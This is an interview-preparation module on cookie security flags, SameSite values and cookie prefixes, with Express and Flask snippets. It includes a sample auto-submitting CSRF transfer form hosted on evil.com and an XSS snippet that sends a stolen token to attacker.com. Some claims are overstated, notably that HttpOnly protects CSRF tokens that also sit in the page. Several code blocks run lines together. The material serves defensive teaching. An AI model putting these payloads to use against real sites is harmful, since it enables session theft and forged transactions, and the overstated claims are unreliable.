# HttpOnly and Secure Cookies Interview Questions  & Answers

<!-- interview-module:v1 -->

> **How to use this interview module**
>
> **Practice:** Cover each answer, then explain it aloud in **60–120 seconds**. Add **one concrete example** from work or a lab.
>
> **Pair with:** the **Comprehensive Guide** and **Critical Clarification** for this topic (if present).

---

## **Fundamental Questions**

### **Q1: What is the HttpOnly attribute and what does it protect against?**

**Answer:** The `HttpOnly` attribute is a cookie security flag that prevents client-side JavaScript from accessing the cookie through `document.cookie` or other DOM APIs.

**What it protects against:**

- ✅ **XSS (Cross-Site Scripting) attacks** - Prevents malicious scripts from stealing cookies
- ✅ **Cookie theft via JavaScript** - Blocks access to sensitive cookie data

**What it does NOT protect against:**

- ❌ **CSRF (Cross-Site Request Forgery) attacks** - Browser still automatically sends cookies with requests
- ❌ **Man-in-the-Middle attacks** - Does not encrypt or secure transmission
- ❌ **Server-side vulnerabilities** - Only affects client-side access

**Example:**

```jsx
// Without HttpOnly (vulnerable)Set-Cookie: sessionId=abc123
// JavaScript can access: document.cookie includes sessionId// With HttpOnly (protected)Set-Cookie: sessionId=abc123; HttpOnly
// JavaScript cannot access: document.cookie does NOT include sessionId
```

---

### **Q2: What is the Secure attribute and why is it important?**

**Answer:** The `Secure` attribute ensures cookies are only transmitted over HTTPS connections. Browsers will refuse to send `Secure` cookies over unencrypted HTTP connections.

**Why it's important:**

- Prevents cookie interception over insecure networks
- Protects against Man-in-the-Middle (MitM) attacks
- Required for `SameSite=None` cookies in modern browsers
- Essential for protecting sensitive data in transit

**Important notes:**

- `Secure` does NOT encrypt the cookie value itself
- Relies on HTTPS/TLS for encryption
- Cookies without `Secure` can be intercepted over HTTP

**Example:**

```jsx
// Without Secure (vulnerable)Set-Cookie: sessionId=abc123
// Sent over HTTP in plaintext - can be intercepted// With Secure (protected)Set-Cookie: sessionId=abc123; Secure
// Only sent over HTTPS - encrypted transmission
```

---

### **Q3: Does HttpOnly protect against CSRF attacks?**

**Answer:** **No, HttpOnly does NOT protect against CSRF attacks.**

This is a common misconception. HttpOnly only prevents JavaScript from accessing cookies, but CSRF attacks don't require JavaScript access to cookies.

**How CSRF works:**

1. User is logged into a website (has session cookie)
2. User visits attacker's website
3. Attacker's website submits a form to the target website
4. Browser automatically includes the user's cookies with the request
5. Target website processes the request with valid cookies
6. Attack succeeds

**Why HttpOnly doesn't help:**

- CSRF attacks rely on the browser automatically sending cookies
- HttpOnly only prevents JavaScript access, not automatic cookie sending
- The browser still sends HttpOnly cookies with requests automatically

**What actually protects against CSRF:**

- `SameSite` attribute (Strict or Lax)
- CSRF tokens
- Custom headers (e.g., X-Requested-With)
- Double-submit cookies

**Example:**

```jsx
// Cookie with HttpOnlySet-Cookie: sessionId=abc123; HttpOnly; Secure

// CSRF attack still works:// Attacker's form on evil.com:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>

// Browser automatically sends cookie:
POST https://bank.com/transfer HTTP/1.1
Cookie: sessionId=abc123  // Still sent automatically!

// HttpOnly did NOT prevent this

```

---

### **Q4: What is the SameSite attribute and how does it protect against CSRF?**

**Answer:** The `SameSite` attribute controls whether cookies are sent with cross-site requests, providing protection against CSRF attacks.

**Values:**

1. **`SameSite=Strict`**: Cookie sent only with same-site requests
    - Maximum CSRF protection
    - Cookie NOT sent with any cross-site requests
    - May require re-authentication when coming from external links
2. **`SameSite=Lax`** (default in modern browsers): Cookie sent with same-site requests and top-level GET navigations
    - Good balance of security and usability
    - Cookie NOT sent with cross-site POST requests
    - Cookie IS sent when user clicks external link (GET navigation)
3. **`SameSite=None`**: Cookie sent with both same-site and cross-site requests
    - Requires `Secure` attribute
    - No CSRF protection
    - Used for third-party integrations

**How it prevents CSRF:**

```jsx
// With SameSite=StrictSet-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly

// CSRF attack from evil.com:POST https://bank.com/transfer HTTP/1.1Cookie: (NOT SENT)// Browser refuses to send cookie// Attack fails - no cookie sent
```

---

### **Q5: What are cookie prefixes (__Secure- and __Host-)?**

**Answer:** Cookie prefixes provide additional security by enforcing constraints at the browser level.

**`__Secure-` prefix:**

- Cookie name must start with `__Secure-`
- Must have `Secure` attribute
- Must be set from HTTPS origin
- Prevents accidental insecure cookie setting

**`__Host-` prefix:**

- Cookie name must start with `__Host-`
- Must have `Secure` attribute
- Must have `Path=/`
- Must NOT have `Domain` attribute
- Must be set from HTTPS origin
- Prevents subdomain cookie access
- Maximum isolation

**Example:**

```jsx
// __Secure- prefixSet-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly
// Browser enforces Secure attribute// __Host- prefixSet-Cookie: __Host-sessionId=abc123; Secure; Path=/; HttpOnly
// Browser enforces no Domain, Path=/, and Secure// Prevents subdomain.example.com from accessing cookie set by example.com
```

---

## **Scenario-Based Questions**

### **Q6: How would you configure cookies to prevent both XSS and CSRF attacks?**

**Answer:** Use a combination of `HttpOnly`, `Secure`, and `SameSite` attributes:

```jsx
Set-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600

```

**Breakdown:**

- `HttpOnly`: Prevents JavaScript access (XSS protection)
- `Secure`: HTTPS-only transmission
- `SameSite=Strict`: Prevents cross-site cookie sending (CSRF protection)
- `__Host-` prefix: Additional security enforcement
- `Path=/`: Site-wide availability
- `Max-Age=3600`: 1-hour expiration

**Alternative (more user-friendly):**

```jsx
Set-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600

```

- `SameSite=Lax` provides CSRF protection while allowing external links to work

---

### **Q7: A user reports that they get logged out when clicking links from email. What could be the cause?**

**Answer:** This is likely caused by `SameSite=Strict` on the session cookie.

**Explanation:**

- `SameSite=Strict` prevents cookies from being sent with ANY cross-site requests
- When a user clicks a link from email (external site), the browser treats it as a cross-site navigation
- The session cookie is not sent, so the user appears logged out

**Solutions:**

1. **Change to SameSite=Lax** (recommended for most applications):
    
    ```jsx
    Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=Lax
    
    ```
    
    - Still provides CSRF protection (blocks cross-site POST)
    - Allows cookies with top-level GET navigations (external links work)
2. **Keep Strict but implement proper redirects**:
    - Email links go to a landing page first
    - Landing page redirects to the actual destination
    - Second navigation is same-site, so cookie is sent
3. **Use separate cookies**:
    - Strict cookie for sensitive operations
    - Lax cookie for general session

---

### **Q8: Your application needs to work with third-party widgets. How do you configure cookies?**

**Answer:** For third-party integrations, you need `SameSite=None` with `Secure`:

```jsx
Set-Cookie: __Secure-widgetSession=abc123; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=1800

```

**Important considerations:**

1. **`SameSite=None` requires `Secure`**: Modern browsers enforce this
2. **No CSRF protection**: `SameSite=None` allows cross-site requests
3. **Use CSRF tokens**: Implement additional CSRF protection
4. **Browser compatibility**: Some browsers block third-party cookies by default
5. **Alternative approaches**: Consider OAuth2, token-based auth, or iframe postMessage

**Example:**

```jsx
// Widget cookie (allows cross-site)Set-Cookie: __Secure-widgetSession=abc123; Secure; HttpOnly; SameSite=None; Path=/

// Main session cookie (same-site only)Set-Cookie: __Host-sessionId=xyz789; Secure; HttpOnly; SameSite=Strict; Path=/

```

---

### **Q9: You discover that your session cookies are being sent over HTTP. What's wrong?**

**Answer:** The cookies are missing the `Secure` attribute.

**Problem:**

```jsx
// Vulnerable configurationSet-Cookie: sessionId=abc123; HttpOnly
// Missing Secure attribute - sent over HTTP
```

**Solution:**

```jsx
// Secure configurationSet-Cookie: sessionId=abc123; HttpOnly; Secure
// Only sent over HTTPS
```

**Additional checks:**

1. Ensure your application is served over HTTPS
2. Check for mixed content (HTTP resources on HTTPS pages)
3. Verify server configuration (some frameworks require explicit Secure setting)
4. Use `__Secure-` prefix to enforce Secure attribute:
    
    ```jsx
    Set-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly
    // Browser will reject if Secure is missing
    ```
    

---

### **Q10: An attacker successfully performs a CSRF attack even though your cookies have HttpOnly. Why?**

**Answer:** HttpOnly does NOT protect against CSRF attacks. The attacker's CSRF attack succeeded because:

1. **HttpOnly only prevents JavaScript access** - It doesn't prevent the browser from automatically sending cookies with requests
2. **CSRF doesn't need JavaScript** - CSRF attacks work by tricking the browser into automatically including cookies
3. **Missing SameSite attribute** - Without `SameSite`, cookies are sent with all requests, including cross-site requests

**Vulnerable configuration:**

```jsx
Set-Cookie: sessionId=abc123; HttpOnly; Secure
// Missing SameSite - CSRF attack succeeds
```

**How the attack works:**

```html
<!-- Attacker's website: evil.com --><form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf-form').submit();</script>

```

```
POST https://bank.com/transfer HTTP/1.1
Host: bank.com
Cookie: sessionId=abc123  // Browser automatically includes cookie
Content-Type: application/x-www-form-urlencoded

to=attacker-account&amount=10000

```

**Solution:**

```jsx
// Add SameSite attributeSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
// Or use SameSite=Lax for better UXSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax

```

---

### **Q11: Your multi-tenant SaaS application has cookies accessible across subdomains. How do you fix this?**

**Answer:** Use the `__Host-` prefix to prevent subdomain access:

**Problem:**

```jsx
// Vulnerable - accessible to all subdomainsSet-Cookie: sessionId=abc123; Domain=.example.com; Secure; HttpOnly
// tenant1.example.com can access tenant2.example.com's cookies
```

**Solution:**

```jsx
// Secure - only accessible to exact hostSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; Path=/
// tenant1.example.com cannot access tenant2.example.com's cookies
```

**Why `__Host-` prefix works:**

- Requires `Path=/`
- Prohibits `Domain` attribute
- Cookie is only accessible to the exact host that set it
- Prevents subdomain cookie access

**Alternative (if you need subdomain sharing):**

```jsx
// Only if you actually need subdomain sharingSet-Cookie: sessionId=abc123; Domain=.example.com; Secure; HttpOnly; SameSite=Lax
// But ensure proper tenant isolation at application level
```

---

### **Q12: Your CSRF tokens are being stolen via XSS. How do you protect them?**

**Answer:** Store CSRF tokens in HttpOnly cookies:

**Vulnerable approach:**

```jsx
// CSRF token in regular cookie (accessible to JavaScript)Set-Cookie: csrf_token=abc123
// XSS can steal it:
<script>
  var token = document.cookie.match(/csrf_token=([^;]+)/)[1];
  fetch('https://attacker.com/steal?token=' + token);
</script>

```

**Secure approach:**

```jsx
// CSRF token in HttpOnly cookieSet-Cookie: csrf_token=abc123; HttpOnly; Secure; SameSite=Strict

// XSS cannot access it:
<script>
  console.log(document.cookie);// Does NOT include csrf_token// Token cannot be stolen
</script>

```

**How CSRF tokens work with HttpOnly:**

1. Server generates unique token for each session
2. Token stored in HttpOnly cookie (prevents XSS theft)
3. Token also embedded in forms (hidden input or meta tag)
4. On form submission, server compares cookie token with form token
5. If they match, request is legitimate
6. If they don't match, request is rejected

**Important note:**

- HttpOnly on CSRF token prevents XSS from stealing it
- But HttpOnly itself doesn't prevent CSRF - the token validation does
- The token must be accessible to the form (via hidden input or meta tag)

---

## **Implementation Questions**

### **Q13: How do you set secure cookies in Node.js/Express?**

**Answer:**

```jsx
const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();

app.use(cookieParser());

app.post('/login', (req, res) => {
  const sessionToken = generateSessionToken();

  res.cookie('__Host-sessionId', sessionToken, {
    secure: true,// HTTPS onlyhttpOnly: true,// No JavaScript accesssameSite: 'strict',// CSRF protectionpath: '/',// Site-widemaxAge: 3600000,// 1 hour (in milliseconds)// Note: __Host- prefix requires no domain option
  });

  res.json({ success: true });
});

```

**Key points:**

- Use `secure: true` for HTTPS-only
- Use `httpOnly: true` for XSS protection
- Use `sameSite: 'strict'` or `'lax'` for CSRF protection
- Use `__Host-` prefix for maximum security (no domain option)
- `maxAge` is in milliseconds

---

### **Q14: How do you set secure cookies in Python/Flask?**

**Answer:**

```python
from flask import Flask, make_response

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    session_token = generate_session_token()
    response = make_response({'success': True})

    response.set_cookie(
        '__Host-sessionId',
        value=session_token,
        secure=True,# HTTPS only
        httponly=True,# No JavaScript access
        samesite='Strict',# CSRF protection
        path='/',# Site-wide
        max_age=3600,# 1 hour (in seconds)# Note: __Host- prefix requires no domain parameter
    )

    return response

```

**Key points:**

- Use `secure=True` for HTTPS-only
- Use `httponly=True` for XSS protection
- Use `samesite='Strict'` or `'Lax'` for CSRF protection
- `max_age` is in seconds (not milliseconds)
- No `domain` parameter for `__Host-` prefix

---

### **Q15: How do you verify that cookies are set correctly?**

**Answer:** Multiple ways to verify:

**1. Browser DevTools:**

```
1. Open DevTools (F12)
2. Go to Application/Storage tab (Chrome) or Storage tab (Firefox)
3. Click Cookies
4. View cookie attributes:
   - HttpOnly: ✓ (checkmark)
   - Secure: ✓ (checkmark)
   - SameSite: Strict/Lax/None
   - Path: /
   - Expires: (date)

```

**2. Command line (curl):**

```bash
# Check Set-Cookie header
curl -I https://example.com/login

# Response should show:
Set-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/

```

**3. Browser Console:**

```jsx
// HttpOnly cookies should NOT appearconsole.log(document.cookie);
// Should NOT include HttpOnly cookies// Check if cookie is sent with requests// Use Network tab in DevTools
```

**4. Online tools:**

- SecurityHeaders.com
- Cookie-Editor browser extension
- Browser DevTools Network tab

---

## **Troubleshooting Questions**

### **Q16: Cookies are not being set. What could be wrong?**

**Answer:** Common issues:

**1. Missing Secure on HTTP:**

```jsx
// Problem: Secure cookie on HTTP connection// Browser will reject itSet-Cookie: sessionId=abc123; Secure
// Solution: Use HTTPS or remove Secure (not recommended)
```

**2. Invalid SameSite=None without Secure:**

```jsx
// Problem: SameSite=None requires SecureSet-Cookie: sessionId=abc123; SameSite=None
// Browser will reject it// Solution: Add Secure attributeSet-Cookie: sessionId=abc123; SameSite=None; Secure

```

**3. Invalid __Host- prefix usage:**

```jsx
// Problem: __Host- prefix with Domain attributeSet-Cookie: __Host-sessionId=abc123; Domain=example.com; Secure; Path=/
// Browser will reject it// Solution: Remove Domain attributeSet-Cookie: __Host-sessionId=abc123; Secure; Path=/

```

**4. Path mismatch:**

```jsx
// Cookie set with Path=/apiSet-Cookie: sessionId=abc123; Path=/api
// Cookie not sent with requests to /// Solution: Use Path=/ for site-wide cookies
```

**5. Domain mismatch:**

```jsx
// Cookie set for example.comSet-Cookie: sessionId=abc123; Domain=example.com
// Cookie not sent to www.example.com (if Domain not set)// Or cookie sent to all subdomains (if Domain=.example.com)
```

---

### **Q17: Users are getting logged out unexpectedly. What could cause this?**

**Answer:** Common causes:

**1. SameSite=Strict with external links:**

```jsx
// Problem: Cookie not sent with external link clicksSet-Cookie: sessionId=abc123; SameSite=Strict
// Solution: Use SameSite=LaxSet-Cookie: sessionId=abc123; SameSite=Lax

```

**2. Cookie expiration:**

```jsx
// Problem: Short Max-AgeSet-Cookie: sessionId=abc123; Max-Age=300// 5 minutes// Solution: Increase Max-Age or implement refresh mechanismSet-Cookie: sessionId=abc123; Max-Age=3600// 1 hour
```

**3. Browser blocking third-party cookies:**

```jsx
// Problem: SameSite=None cookies blockedSet-Cookie: sessionId=abc123; SameSite=None; Secure
// Some browsers block third-party cookies by default// Solution: Use alternative authentication (OAuth, tokens)
```

**4. Server-side session expiration:**

- Check server-side session timeout
- Implement session refresh mechanism
- Check for session cleanup jobs

---

## **Advanced Questions**

### **Q18: Explain the difference between HttpOnly, Secure, and SameSite attributes.**

**Answer:**

| Attribute | Protects Against | How It Works | When to Use |
| --- | --- | --- | --- |
| **HttpOnly** | XSS (cookie theft) | Prevents JavaScript access to cookies | Always for sensitive cookies |
| **Secure** | MitM attacks | Ensures HTTPS-only transmission | Always in production |
| **SameSite** | CSRF attacks | Controls cross-site cookie sending | Always (Strict or Lax) |

**HttpOnly:**

- Prevents `document.cookie` access
- Protects against XSS cookie theft
- Does NOT prevent CSRF

**Secure:**

- Requires HTTPS connection
- Prevents interception over HTTP
- Required for `SameSite=None`

**SameSite:**

- Controls when cookies are sent
- `Strict`: Same-site only
- `Lax`: Same-site + top-level GET
- `None`: All requests (requires Secure)

**Best practice:**

```jsx
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax
// All three together provide comprehensive protection
```

---

### **Q19: How do you implement "Remember Me" functionality securely?**

**Answer:** Use separate cookies with different lifespans:

```jsx
// Short-lived session cookieSet-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600

// Long-lived remember me tokenSet-Cookie: __Secure-rememberToken=xyz789; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=2592000

```

**Implementation:**

1. User logs in and checks "Remember Me"
2. Server generates two tokens:
    - Session token (short-lived, e.g., 1 hour)
    - Remember token (long-lived, e.g., 30 days)
3. Both stored in HttpOnly, Secure cookies
4. On each request:
    - If session token valid: user is authenticated
    - If session token expired but remember token valid: refresh session token
    - If both expired: require re-authentication

**Security considerations:**

- Remember token should be cryptographically random
- Store token hash on server (not plain token)
- Implement token rotation on use
- Allow users to revoke remember tokens
- Monitor for suspicious activity

---

### **Q20: How do cookie security attributes work together in a defense-in-depth strategy?**

**Answer:** Each attribute provides a different layer of protection:

**Layer 1: HttpOnly (XSS Protection)**

```jsx
HttpOnly: Prevents JavaScript from stealing cookies

```

**Layer 2: Secure (Transmission Protection)**

```jsx
Secure: Ensures cookies only sent over HTTPS

```

**Layer 3: SameSite (CSRF Protection)**

```jsx
SameSite: Prevents cookies from being sent with cross-site requests

```

**Layer 4: Cookie Prefixes (Enforcement)**

```jsx
__Host- or __Secure-: Browser-level enforcement of security rules

```

**Layer 5: Short Expiration (Exposure Limitation)**

```jsx
Max-Age: Limits window of exposure if cookie is compromised

```

**Complete defense-in-depth:**

```jsx
Set-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600

```

**Additional layers:**

- Server-side session validation
- IP address validation
- User-Agent validation
- Rate limiting
- Anomaly detection
- Regular token rotation

**Why defense-in-depth matters:**

- If one layer fails, others provide protection
- No single security measure is perfect
- Multiple layers make attacks more difficult
- Provides redundancy and resilience

---

## **Quick Reference Answers**

### **What protects against XSS?**

**Answer:** HttpOnly attribute

### **What protects against CSRF?**

**Answer:** SameSite attribute (Strict or Lax) or CSRF tokens

### **What protects against MitM attacks?**

**Answer:** Secure attribute (HTTPS)

### **What is the recommended cookie configuration?**

**Answer:** `__Secure-sessionId=token; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600`

### **Does HttpOnly protect against CSRF?**

**Answer:** No, HttpOnly only protects against XSS. Use SameSite or CSRF tokens for CSRF protection.

---

## **Summary**

These interview questions cover:

- ✅ Fundamental concepts (HttpOnly, Secure, SameSite)
- ✅ Common misconceptions (HttpOnly vs CSRF)
- ✅ Real-world scenarios
- ✅ Implementation details
- ✅ Troubleshooting
- ✅ Advanced topics

**Key takeaway:** HttpOnly protects against XSS, SameSite protects against CSRF, and Secure ensures HTTPS-only transmission. Use all three together for comprehensive cookie security.

---

## Depth: Interview follow-ups — Cookie Security

**Authoritative references:** [RFC 6265](https://www.rfc-editor.org/rfc/rfc6265) (HTTP cookies); [SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) (MDN—browser behavior); [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html).

**Follow-ups:**
- **`SameSite=Lax` vs `Strict` vs `None`** — when is `None` required and what else is mandatory?
- **Prefix cookies** (`__Host-`, `__Secure-`) — deployment constraints.
- **Domain / Path scope** — minimizing blast radius.

**Production verification:** Set-Cookie flags on all auth responses; no secrets in non-HttpOnly stores when XSS matters.

**Cross-read:** CSRF, XSS, OAuth, Cross-Origin Authentication.

---

## Depth: Interview follow-ups — HttpOnly & Secure Cookies

**Authoritative references:** [MDN Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie); [OWASP Session Management CS](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html); [SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) (browser enforcement).

**Follow-ups:**
- **HttpOnly stops JS read—not CSRF** — why browsers still attach cookies on cross-site requests per policy.
- **`SameSite=None` requires `Secure`** — deployment gotchas.
- **Subdomain cookie scope** — `Domain=` attribute risks.

**Production verification:** Inspect Set-Cookie on all auth responses; fix mixed content; monitor for unexpected cross-site POSTs to state-changing routes.

**Cross-read:** CSRF, XSS, OAuth, Cross-Origin Authentication.

<!-- verified-depth-merged:v1 ids=cookie-security,httponly-and-secure-cookies-interview-questions -->
